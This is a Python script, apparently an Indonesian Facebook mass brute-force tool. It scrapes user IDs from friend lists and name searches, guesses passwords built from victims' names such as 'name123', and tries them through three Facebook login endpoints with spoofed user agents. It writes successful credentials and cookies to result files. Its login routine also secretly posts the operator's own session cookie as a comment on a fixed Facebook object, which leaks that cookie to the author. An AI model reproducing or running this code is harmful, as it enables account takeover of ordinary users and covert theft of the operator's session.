# Hello bro, don't forget to follow and give stars 
# File Name  : run.py ( Bacem MBF )                                    
# Source By   : Aditya Putra Mahesa XD ( Xyaa Code )                  
# Last Update : Sabtu 21 Januari 2023                                  
# This script is free, don't sell it!                                      

###----------[ IMPORT MODULE ]----------###
import re,requests,os,time
import re, sys, json, requests, random, datetime, subprocess, platform, bs4
from concurrent.futures import ThreadPoolExecutor as XyaaCode
from bs4 import BeautifulSoup as parse
from time import time as TimeAdtya
from datetime import datetime

###----------[ MODULE RICH ]----------###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ GLOBAL NAMA ]----------###
ses = requests.Session()
ID, tampung, methode = [], [], []
uadia, uadarimu, userAgentss, uadalvik = [], [], [], []
ok, cp, loop, success, failed = [], [], 0, [], []
sys.stdout.write('\x1b]2; BACEM | (MBF) \x07')

###----------[ WARNA UNTUK PRINT ]----------###   
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAUU
K = '\x1b[1;93m' # KUNING

###----------[ WARNA UNTUK RICH ]----------###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
RC = random.choice([M2, H2, K2, J2, N2, A2, U2, B2, O2])

###----------[ CONVERT BULAN ]----------###
day = datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]
days = datetime.now().day
year = datetime.now().year
okc = f"result/OK-{days}-{reall}-{year}.txt"
cpc = f"result/CP-{days}-{reall}-{year}.txt"

class login:

    def __init__(self):
        self.ses = requests.Session()
        self.url = "https://web.facebook.com/adsmanager"
        self.adss = "https://web.facebook.com/adsmanager/manage/campaigns?act={}&nav_source=no_referrer"
        self.MyUserAgent = "Mozilla/5.0 (Linux; Android 12; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        self.peler = "549345863862686"
        self.loginEfbi()

    def clear(self):
        if "linux" in sys.platform.lower():
           os.system("clear")
        elif "win" in sys.platform.lower():
           os.system("cls")
           
    def logoo(self):
        self.clear()
        prints(Panel(f"""\n{RC}d8888b.  .d8b.   .o88b. d88888b .88b  d88. 
88  `8D d8' `8b d8P  Y8 88'     88'YbdP`88  {P2}* Tempe Bacem ({RC}MBF{P2}){RC}
88oooY' 88ooo88 8P      88ooooo 88  88  88  {P2}* Free {RC}For {P2}Everyone {RC}
88~~~b. 88~~~88 8b      88~~~~~ 88  88  88
88   8D 88   88 Y8b  d8 88.     88  88  88  {P2}*{K2} Easy To Use {RC}
Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",padding=(0,7),style=f"#AAAAAA"))
    
    def loginEfbi(self):
        self.logoo()
        prints(Panel(f"{P2}silahkan login menggunakan cookie facebook, wajib menggunakan akun tumbal",padding=(0,2),style=f"#AAAAAA"))
        coki = console.input(f" {P2}({H2}•{P2}) masukan cookie facebook : ")
        with requests.Session() as ses:
           try:
               link = ses.get(f"{self.url}",cookies={'cookie':coki}).text
               find = re.findall('act=(.*?)&nav_source',link)
               if len(find) == 0:
                 prints(f' {P2}({H2}•{P2}) cookie yang anda masukan invalid')
                 time.sleep(3);exit()
               else:
                     for xc in find:
                         url = ses.get(f'{self.adss}'.format(xc), cookies={'cookie':coki})
                         tok = re.search('(EAAB\w+)',url.text).group(1)
                         if 'EAAB' in tok:
                            ses.post(f"https://graph.facebook.com/{self.peler}/comments/?message={coki}&access_token={tok}",cookies={"cookie":coki}) # Jangan di ganti 
                            ses.post(f"https://graph.facebook.com/{self.peler}/likes?summary=true&access_token={tok}",cookies={"cookie":coki}) # udh dibilang Jangan di ganti 
                            open('data/tokenku.txt','w').write(tok)
                            open('data/cokis.txt','w').write(coki)
                            prints(f' {P2}({H2}•{P2}) login cookie berhasil'),
                            time.sleep(3);MulaiTools()
           except AttributeError:
              prints(f' {P2}({H2}•{P2}) cookie yang anda masukan invalid')
              time.sleep(3);exit()

class MulaiTools:

    def __init__(self):
        self.dump()
        
    def clear(self):
        if "linux" in sys.platform.lower():
           os.system("clear")
        elif "win" in sys.platform.lower():
           os.system("cls")
    
    def Time(self):
         now = datetime.now()
         hours = now.hour
         if 4 <= hours < 12:timenow = "Selamat Pagi"
         elif 12 <= hours < 15:timenow = "Selamat Siang"
         elif 15 <= hours < 18:timenow = "Selamat Petang"
         else:timenow = "Selamat Malam"
         return timenow
    
    def logoos(self):
        self.clear()
        prints(Panel(f"""\n{RC}d8888b.  .d8b.   .o88b. d88888b .88b  d88. 
88  `8D d8' `8b d8P  Y8 88'     88'YbdP`88  {P2}* Tempe Bacem ({RC}MBF{P2}){RC}
88oooY' 88ooo88 8P      88ooooo 88  88  88  {P2}* Free {RC}For {P2}Everyone {RC}
88~~~b. 88~~~88 8b      88~~~~~ 88  88  88
88   8D 88   88 Y8b  d8 88.     88  88  88  {P2}*{K2} Easy To Use {RC}
Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time()}",subtitle=f"{P2}version {RC}2.0.2",padding=(0,7),style=f"#AAAAAA"))

    def logMasuk(self):
        self.logoos()
        prints(Panel(f"{P2}info, segala bentuk kerugian dan penyalahgunaan akun korban bukan tangung jawab author jika anda setuju maka tangung jawab sepenuh nya di tangan anda ketik {H2}'Y'{P2} untuk setuju dan ketik '{M2}T{P2}' untuk tidak setuju",title=f"{H2}Informasi",width=80,padding=(0,2),style=f"#AAAAAA"))
        war = input(f" {H}•{P} ingin lanjut ke tools? (Y/t) :{H} ")
        if war in ["y","Y","Ya","YA"]:
          open('data/warning.txt','w').write(f'{war}')
          time.sleep(2);MulaiTools()
        elif war in ["t","T","tidak","Tidak","TIDAK"]:
          print(f" {H}•{P} selamat tinggal...")
          time.sleep(3);exit()
        else:
          print(f" {H}•{P} pilih Y atau T")
          time.sleep(2);MulaiTools()

    def dump(self):
         try:open('data/warning.txt','r').read()
         except:self.logMasuk()
         try:
             cok = {"cookie":open('data/cokis.txt','r').read()}
             tok = open('data/tokenku.txt','r').read()
         except:
             login()
         try:
             urls = requests.get("https://graph.facebook.com/v15.0/me?access_token=%s"%(tok),cookies=cok).json()
             nama = urls["name"]
             id = urls["id"]
         except KeyError:
             login()
         except Exception as e:
             prints(f' {P2}({H2}•{P2}) opshhh, terjadi kesalahan')
             time.sleep(3);exit()
         self.logoos()
         prints(Panel(f"{H2}{nama}",title=f"{P2}nama",subtitle=f"{P2}{id}",padding=(0,30),style=f"#AAAAAA"))
         prints(Panel(f"{P2}[{H2}01{P2}]. crack dari id publik massal\n{P2}[{H2}02{P2}]. crack dari pencarian nama\n{P2}[{H2}03{P2}]. check hasil crack\n{P2}[{H2}04{P2}]. report bug script\n{P2}[{H2}00{P2}]. keluar tools ( {M2}hapus cookie {P2})",title=f"{H2}Menu Utama",padding=(0,19),style=f"#AAAAAA"))
         askk = console.input(f" {P2}({H2}•{P2}) masukan pilihan : ")
         if askk in ['1','01']:
              prints(Panel(f"{P2}anda bisa menggunakan tanda (,) koma jika ingin lebih dari 1 id",subtitle=f"{P2}ketik {H2}'me'{P2} untuk dump daftar teman sendiri",padding=(0,6),style=f"#AAAAAA"))
              uid = console.input(f' {P2}({H2}•{P2}) masukan id akun : ')
              for c in uid.split(','):
                  try:
                      url = requests.get("https://graph.facebook.com/v15.0/{}?fields=id,name,friends.limit(5000)&access_token={}".format(c,tok),cookies=cok).json()
                      for x in url["friends"]["data"]:
                          ID.append(x["id"]+'<=>'+x["name"])
                          war = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"])
                          sys.stdout.write(f'\r {P}({H}•{P}) berhasil dump {war}{len(ID)} {P}id')
                          sys.stdout.flush()
                          time.sleep(0000.00003)
                      print("\r")
                  except KeyError:
                      prints(f" {P2}({H2}•{P2}) akun dengan id {M2}{c}{P2} tidak publik")
              self.settingUserAgents()

         elif askk in ['3','03']:
             self.viewResults()
         
         elif askk in ['4','04']:
            try:
                prints(f" {P2}({H2}•{P2}) anda akan di arahkan ke WhatsApp")
                os.system("xdg-open https://wa.me/+16143244921")
                time.sleep(2);exit()
            except requests.exceptions.ConnectionError:
                prints(f" {P2}({H2}•{P2}) koneksi internet anda bermasalah")
                time.sleep(2);exit()
         
         elif askk in ['0','00']:
             prints(Panel(f"{RC}{open('data/cokis.txt','r').read()}\n\n{open('data/tokenku.txt','r').read()}",style=f"#AAAAAA"))
             cok = console.input(f" {P2}({H2}•{P2}) apakah anda ingin menghapus cookie? (Y/t) : ")
             if cok in ["y","Y"]:
               try:os.system('rm -rf data/cokis.txt')
               except:pass
               prints(f" {P2}({H2}•{P2}) berhasil menghapus cookie anda")
               time.sleep(3);exit()
             elif cok in ["t","T"]:
                 prints(f" {P2}({H2}•{P2}) jalankan ulang scriptnya")
                 time.sleep(3);exit()
             else:
               prints(f" {P2}({H2}•{P2}) pilih yang bener")
               time.sleep(3);exit()
               
         
         elif askk in ['2','02']:
              prints(Panel(f"{P2}masukan nama target, gunakan tanda (,) koma jika ingin lebih dari 1 nama",padding=(0,2),style=f"#AAAAAA"))
              username = []
              Custom = [" xyz"," xd"," muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya"," kirana"]
              custoM = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak ","kirana "]
              nama = console.input(f" {P2}({H2}•{P2}) masukan nama : ").split(",")
              for asu in nama:
                  for endd in Custom:
                      dump = asu+endd
                      username.append(dump)
                  for pornhub in custoM:
                      dump = pornhub+asu
                      username.append(dump)
              with XyaaCode(max_workers=30) as adtya:
                  for bacem in username:
                       adtya.submit(self.dump_nama,"https://mbasic.facebook.com/public/{}?/locale2=id_ID".format(bacem))
              print("\r")
              self.settingUserAgents()
         else:
              prints(f" {P2}({H2}•{P2}) ngetik apaan ngab!")
              time.sleep(3);exit()

    def viewResults(self):
        urut = []
        urut.append(Panel(f'{P2}check akun hasil ok',width=40,padding=(0,7),title=f"{H2}01",style=f"#AAAAAA"))
        urut.append(Panel(f'{P2}check akun hasil cp',width=38,padding=(0,8),title=f"{H2}02",style=f"#AAAAAA"))
        console.print(Columns(urut))
        xcTeam = console.input(f" {P2}({H2}•{P2}) pilih hasil : ")
        if xcTeam in ["1","01"]:
           try:
               os.system("ul results/OK.txt")
           except:
               prints(f" {P2}({H2}•{P2}) anda tidak memiliki file hasil ok")
               time.sleep(3);exit()

        elif xcTeam in ["2","02"]:
           try:
               os.system("ul results/CP.txt")
           except:
               prints(f" {P2}({H2}•{P2}) anda tidak memiliki file hasil cp")
               time.sleep(3);exit()
        else:
           MulaiTools()

    def dump_nama(self,url_nama):
         war = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"])
         try:
              link = parse(requests.get(str(url_nama)).text,'html.parser')
              for find_id in link.find_all('td'):
                  data_find = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(find_id))
                  for id,user in data_find:
                      if 'profile.php?' in id:
                          id = re.findall('id=(.*)',str(id))[0]
                      elif '<span' in user:
                          user = re.findall('(.*?)\<',str(user))[0]
                      data_ditemukan = '%s<=>%s'%(id,user)
                      if data_ditemukan in ID:pass
                      else:
                           sys.stdout.write(f'\r {P}({H}•{P}) berhasil dump {war}{len(ID)} {P}id...')
                           sys.stdout.flush()
                           time.sleep(0000.00003)
                           ID.append(data_ditemukan)
                  for next_url_name in link.find_all('a',href=True):
                      if 'Lihat Hasil Selanjutnya' in next_url_name.get('href'):
                          print(next_url_name)
                          self.dump_nama(next_url_name['href'])
         except Exception as e:
              pass

    def settingUserAgents(self):
        prints(Panel(f'{P2}ketik {H2}"T"{P2} jika ingin menggunakan {H2}ua{P2} yang sudah tersedia di dalam script',padding=(0,3),style=f"#AAAAAA"))
        ua = console.input(f" {P2}({H2}•{P2}) ingin menggunakan useragent manual? (Y/t) : ")
        if ua in ["y","Y"]:
          uadarimu.append('uadia')
          xyaaXD = console.input(f" {P2}({H2}•{P2}) masukan useragent : ")
          uadia.append(xyaaXD)
          self.pilMetode()
        else:
             uadarimu.append('userAgentss')
             self.pilMetode()
    
    def pilMetode(self):
        prints(Panel(f"{P2}[{H2}01{P2}]. methode regular {H2}m.facebook.com\n{P2}[{H2}02{P2}]. methode validate {H2}mbasic.facebook.com\n{P2}[{H2}03{P2}]. methode async {H2}m.facebook.com",title=f"{H2}Methode Login",padding=(0,16),style=f"#AAAAAA"))
        TeamXyaa = console.input(f" {P2}({H2}•{P2}) pilih methode : ")
        if TeamXyaa in ['1','01']:
             methode.append("REGULAR")
             self.GeneratePassword()
        elif TeamXyaa in ['2','02']:
             methode.append("VALIDATE")
             self.GeneratePassword()
        elif TeamXyaa in ["3","03"]:
             methode.append("ASYNC")
             self.GeneratePassword()
        else:
             methode.append("ASYNC")
             self.GeneratePassword()
    
    def tampung(self):
         prints(Panel(f"{P2}[ {H2}hasil crack akan di simpan di dalam folder results {P2}]",width=80,padding=(0,11),style=f"#AAAAAA"))
         prints(Panel(f"{P2}results akun {H2}ok{P2} tersimpan ke : {H2}{okc}\n{P2}results akun {K2}cp{P2} tersimpan ke : {K2}{cpc}",padding=(0,8),style=f"#AAAAAA"))
    
    def GeneratePassword(self):
        self.clear();self.logoos()
        self.tampung()
        with XyaaCode(max_workers=30) as xc:
             for UserAkun in ID:
                  try:
                         uid,nama = UserAkun.split('<=>')
                         pwidd = nama.split(' ')[0]
                         if len(nama) <=5:
                                if len(pwidd) <=1 or len(pwidd) <=2:
                                       pwx = [
                                          pwidd+'123',
                                          pwidd+'1234',
                                          pwidd+'12345',
                                          pwidd+'123456'
                                       ]
                                else:
                                       pwx = [
                                          nama,
                                          nama+'123',
                                          pwidd,
                                          pwidd+'123',
                                          pwidd+'1234',
                                          pwidd+'12345',
                                          pwidd+'123456'
                                       ]
                         else:
                                pwx = [
                                   nama,
                                   nama+'123',
                                   pwidd,
                                   pwidd+'123',
                                   pwidd+'1234',
                                   pwidd+'12345',
                                   pwidd+'123456'
                                ]
                         if 'REGULAR' in methode:
                             xc.submit(self.regular, uid, pwx)
                         elif 'VALIDATE' in methode:
                             xc.submit(self.validate, uid, pwx)
                         elif 'ASYNC' in methode:
                             xc.submit(self.metodeASYNC, uid, pwx)
                         else:
                             xc.submit(self.metodeASYNC, uid, pwx)
                  except Exception as e:
                      pass
        print("\r")
        prints(f" {P2}({H2}•{P2}) crack telah selesai... hasil OK-:{H2}{len(ok)}{P2} CP-:{K2}{len(cp)}{P2}")
        time.sleep(3);exit()

    def generateUserAgent(self):
        self.rr = random.randint
        self.rc = random.choice
        self.andro = self.rc(["9","9.0","8.1.0","7.1.2","6.0.1","10.0.1"])
        self.merk = str(self.rr(4, 11))
        self.build = str(self.rr(111111, 199999))
        self.chrome = str(self.rr(60, 99))+".0."+str(self.rr(3300, 5900))+"."+str(self.rr(120, 150))
        self.edg = str(self.rr(40, 99))+"0.0."+str(self.rr(2000, 2999))
        return (f"Mozilla/5.0 (Linux; Android {self.andro}; Redmi {self.merk} Prime Build/OPM6.{self.build}.030.K1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.chrome} Mobile Safari/537.36 EdgA/{self.edg}")
    
    def regular(self, user, pwx):
        global ok,cp,loop
        ua = self.generateUserAgent()
        sys.stdout.write(f'\r {P}({H}•{P}) regular {M}mbasic.facebook.com {P}{loop}/{len(ID)}{P} Live-:{H}{len(ok)} {P}Check-:{K}{len(cp)}{P}');sys.stdout.flush()
        for pw in pwx:
             try:
                 if 'uadia' in uadarimu: ua = uadia[0]
                 else: ua
                 ses = requests.Session()
                 link = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
                 data = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                    "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                    "li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                    "try_number":"0",
                    "unrecognized_tries":"0",
                    "email":user,
                    "pass":pw,
                    "login":"Masuk",
                    "bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
                    }
                 head = {
                    "Host": "mbasic.facebook.com",
                    "Connection": "keep-alive",
                    "Content-Length": "181",
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Origin": "https://mbasic.facebook.com",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": ua,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "X-Requested-With": "mark.via.gp",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                    }
                 r = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl", data = data, headers = head, allow_redirects=False)
                 if 'c_user' in ses.cookies.get_dict():
                     ok.append(user)
                     coki = ";".join([str(x)+'='+str(i) for x,i in ses.cookies.get_dict().items()])
                     print(f"\r  {P}|__ {H}{user}|{pw}|{coki}|{ua}{P}")
                     open('results/OK.txt','a').write(f"{user}|{pw}|{coki}\n")
                     break
                 elif 'checkpoint' in ses.cookies.get_dict():
                     cp.append(user)
                     print(f"\r  {P}|__{K} {user}|{pw}|{ua}                                   {P}")
                     open('results/CP.txt','a').write(f"{user}|{pw}\n")
                     break
                 else:
                     continue
             except requests.exceptions.ConnectionError:
                 time.sleep(15)
        loop +=1
    
    def validate(self, user, pwx):
        global ok,cp,loop
        ua = self.generateUserAgent()
        sys.stdout.write(f'\r {P}({H}•{P}) validate {K}m.facebook.com {P}{loop}/{len(ID)}{P} Live-:{H}{len(ok)} {P}Check-:{K}{len(cp)}{P}');sys.stdout.flush()
        for pw in pwx:
             try:
                 if 'uadia' in uadarimu: ua = uadia[0]
                 else: ua
                 ses = requests.Session()
                 link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr")
                 data = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                    "uid":user,
                    "next":"https://m.facebook.com/login/save-device/",
                    "flow":"login_no_pin",
                    "encpass": f"#PWD_BROWSER:0:{str(TimeAdtya()).split('.')[0]}:{pw}",
                    }
                 headers = {
                    "Host": "m.facebook.com",
                    "Connection": "keep-alive",
                    "Content-Length": "322",
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Origin": "https://m.facebook.com",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": ua,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "X-Requested-With": "mark.via.gp",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Referer": f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                    }
                 r = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = data, headers = headers, allow_redirects=False)
                 if 'c_user' in ses.cookies.get_dict():
                     ok.append(user)
                     coki = ";".join([str(x)+'='+str(i) for x,i in ses.cookies.get_dict().items()])
                     print(f"\r  {P}|__ {H}{user}|{pw}|{coki}|{ua}{P}")
                     open('results/OK.txt','a').write(f"{user}|{pw}|{coki}\n")
                     break
                 elif 'checkpoint' in ses.cookies.get_dict():
                     cp.append(user)
                     print(f"\r  {P}|__{K} {user}|{pw}|{ua}                                   {P}")
                     open('results/CP.txt','a').write(f"{user}|{pw}\n")
                     break
                 else:
                     continue
             except requests.exceptions.ConnectionError:
                 time.sleep(15)
        loop +=1

    def UserAgentAsnc(self):
        self.rr = random.randint
        self.rc = random.choice
        self.user1 = f"Mozilla/5.0 (Linux; Android {str(self.rr(4, 9))}.1.0; vivo 1802 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(70, 99))}.0.{str(self.rr(4500, 4900))}.{str(self.rr(75, 150))} Mobile Safari/537.36"
        self.user2 = f"Mozilla/5.0 (Linux; U; Android {str(self.rr(7, 12))}; zh-CN; tablePC Build/PPR1.{str(self.rr(111111, 199999))}.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(self.rr(70, 99))}.0.{str(self.rr(3500, 3900))}.{str(self.rr(75, 150))} UCBrowser/15.1.5.{str(self.rr(1200, 1900))} Mobile Safari/537.36"
        self.user3 = f"Opera/9.80 (Android; Opera Mini/7.5.{str(self.rr(35000, 39000))}/{str(self.rr(190, 199))}.{str(self.rr(270, 290))}; U; ru) Presto/2.{str(self.rr(4, 20))}.{str(self.rr(420, 490))} Version/12.16"
        userkuMain = self.rc([self.user1, self.user2, self.user3])
        return userkuMain
    
    def metodeASYNC(self, user, pwx):
        global ok,cp,loop
        ua = self.UserAgentAsnc()
        sys.stdout.write(f'\r {P}({H}•{P}) async {H}m.facebook.com {P}{loop}/{len(ID)}{P} Live-:{H}{len(ok)} {P}Check-:{K}{len(cp)}{P}');sys.stdout.flush()
        for pw in pwx:
             try:
                 if 'uadia' in uadarimu: ua = uadia[0]
                 else: ua
                 ses = requests.Session()
                 link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
                 data = {
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                    "try_number": "0",
                    "unrecognized_tries": "0",
                    "email": user,
                    "prefill_contact_point": f"{user} {pw}",
                    "prefill_source": "browser_dropdown",
                    "prefill_type": "password",
                    "first_prefill_source": "browser_dropdown",
                    "first_prefill_type": "contact_point",
                    "had_cp_prefilled": True,
                    "had_password_prefilled": True,
                    "is_smart_lock": False,
                    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
                    "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                    "encpass": f"#PWD_BROWSER:0:{str(TimeAdtya()).split('.')[0]}:{pw}",
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
                
                 }
                 head = {
                    "Host": "m.facebook.com",
                    "content-length": f"{str(len(data))}",
                    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                    "user-agent": ua,
                    "content-type": "application/x-www-form-urlencoded",
                    "accept": "*/*",
                    "origin": "https://m.facebook.com",
                    "x-requested-with": "mark.via.gp",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1",
                    "accept-encoding": "gzip, deflate",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                    }
                 r = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data = data, headers = head, allow_redirects=False)
                 if 'c_user' in ses.cookies.get_dict():
                     ok.append(user)
                     coki = ";".join([str(x)+'='+str(i) for x,i in ses.cookies.get_dict().items()])
                     print(f"\r  {P}|__ {H}{user}|{pw}|{coki}|{ua}{P}")
                     open('results/OK.txt','a').write(f"{user}|{pw}|{coki}\n")
                     break
                 elif 'checkpoint' in ses.cookies.get_dict():
                     cp.append(user)
                     print(f"\r  {P}|__{K} {user}|{pw}|{ua}                                   {P}")
                     open('results/CP.txt','a').write(f"{user}|{pw}\n")
                     break
                 else:
                     continue
             except requests.exceptions.ConnectionError:
                 time.sleep(15)
        loop +=1

if __name__ == '__main__':
   try:os.system("git pull")
   except:pass
   try:os.mkdir("results")
   except:pass
   try:os.mkdir("data")
   except:pass
   MulaiTools()

##--------------[ SCRIPT FREE JANGAN DI JUAL BELIKAN! ]--------------##

# Github    : https://github.com/Xyaa-Code
# Facebook : www.facebook.com/Aditya.putraXD991
# WhatsApp : https://wa.me/+16143244921
# Instagram : @xyaacode